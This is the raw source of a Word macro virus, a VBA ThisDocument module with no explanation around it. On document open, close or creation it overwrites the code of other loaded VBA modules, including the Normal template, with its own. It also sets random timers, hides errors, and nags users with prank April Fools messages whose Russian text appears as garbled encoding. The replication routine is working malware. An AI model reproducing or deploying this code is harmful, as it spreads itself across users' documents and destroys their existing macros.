   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Private Sub Document_Close()
   On Error Resume Next
   Document_Open
   End Sub

   Private Sub Document_New()
   On Error Resume Next
   Document_Open
   End Sub

   Private Sub Document_Open()
   On Error Resume Next
       With Options
    '       .SaveNormalPrompt = False
   '        .VirusProtection = False
       End With
   Dim I%, j%, k As Long, m As Boolean
   Application.OnTime When:=Now + TimeValue("00:" & Format(Int(Rnd * 5) + 1, "00") & ":00"), Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & ".OnTimer"
   For I = 1 To VBE.VBProjects.Count
    For j = 1 To VBE.VBProjects(I).VBComponents.Count
     With VBE.VBProjects(I).VBComponents(j).CodeModule
        If .CountOfLines > 80 Or .CountOfLines < 50 Then
        .deletelines 1, .CountOfLines
        Err.Clear
         .AddFromString Me.VBProject.VBComponents(Me.CodeName).CodeModule.Lines(1, Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfLines)
         If Err = 0 Then
           m = False
           For k = .CountOfLines To .CountOfLines - 20 Step -1
              If .Find("Sub OnTimer", k, 1, k, 30) Then m = True: Exit For
           Next
           If m Then
               .deletelines k
               '.InsertLines k, IIf(VBE.VBProjects(I).Name = "Normal", "Sub OnTimer()", "Private Sub OnTimer1()")
           End If
         Else
         Application.OnTime When:=Now + TimeValue("00:00:10"), Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & ".OnTimer"
         End If
        End If
     End With
    Next
   Next
   End Sub
   Private Sub ShowMess()
   On Error Resume Next
   If Left(Application.Version, 1) = "8" Then
     ShVer8
   Else
    If MsgBox(GetMess(), vbOKCancel, Choose(Int(Rnd * 9) + 1, "Ñ 1 Àïðåëÿ Âàñ!", "Îïà?-Óãó!", "À âîò è ñåãîäíÿøíèé ïðèêîë", "Word: Ýòî ÿ áóêâàëüíî òîëüêî ÷òî ïðèäóìàë", "õå-õå", "Word: Ýòî ÿ â Ðóññêîì ðàäèî óñëûøàë", "Ðåêëàìíàÿ ñëóæáà Microsoft Word", "Word: Çàäîëáàëè ìåíÿ ýòè ìàêðîâèðóñû", "Âîò Âàì," & Application.UserName, "Ïîñëåäíèé ïðèêîë ñåçîíà", "Word: Îé, ñåé÷àñ îïèñàþñü...")) = 1 Then ShowMess
   End If
   End Sub
   Private Sub ShVer8()
    On Error Resume Next
    Assistant.Visible = True
    Dim bln As Balloon
    Set bln = Assistant.NewBalloon
    With bln
     .Mode = msoModeAutoDown
     .Heading = GetMess()
     .Animation = Int(Rnd * (117))
     .Button = msoButtonSetNextClose
     .Text = Choose(Int(Rnd * 14) + 1, "Ñ 1 Àïðåëÿ Âàñ, " & Application.UserName & Space(100) & Assistant.Name, "Îïà?-Óãó!", "", "", "óìðó îò ñìåõà", "ïðàâäà ñìåøíî", "À âîò è ñåãîäíÿøíèé ïðèêîë", Assistant.Name & ": Ýòî ÿ áóêâàëüíî òîëüêî ÷òî ïðèäóìàë", Assistant.Name & ": Îé, ñåé÷àñ îïèñàþñü...", "õå-õå", Assistant.Name & ": Ýòî ÿ â Ðóññêîì ðàäèî óñëûøàë", "Ðåêëàìíàÿ ñëóæáà Microsoft Word", Assistant.Name & ": Çàäîëáàëè ìåíÿ ýòè ìàêðîâèðóñû", "Âîò Âàì," & Application.UserName, "Ïîñëåäíèé ïðèêîë ñåçîíà")
     If .Show = -6 Then ShowMess
    End With
    Assistant.Animation = 0
   End Sub
   Private Function GetMess()
   On Error Resume Next
   GetMess = Mid(Me.VBProject.VBComponents(Me.CodeName).CodeModule.Lines(Int(Rnd * Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfDeclarationLines) + 1, 1), 2)
   End Function
